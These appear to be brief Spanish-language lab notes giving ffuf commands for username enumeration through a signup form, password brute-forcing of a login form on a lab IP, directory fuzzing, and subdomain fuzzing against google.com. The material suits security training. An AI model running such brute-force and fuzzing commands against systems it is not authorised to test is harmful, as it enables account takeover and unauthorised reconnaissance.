fuerza bruta obtener username
 ej: ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.201.98.213/customers/signup -mr "username already exists"

fuerza bruta obtener contraseña a partir del diccionario de usuarios del ejemplo anterior
 ej: ffuf -w temp.txt:W1,/usr/share/wordlists/seclists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.201.98.213/customers/login -fs 200 (fs filtra resultados)


//fuzzing de directorio
ffuf -u <http://example.com/FUZZ> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

//fuzzing de subdominios
ffuf -u https://google.com -w diccionario.txt -mc 200 -H "HOST: FUZZ.google.com"

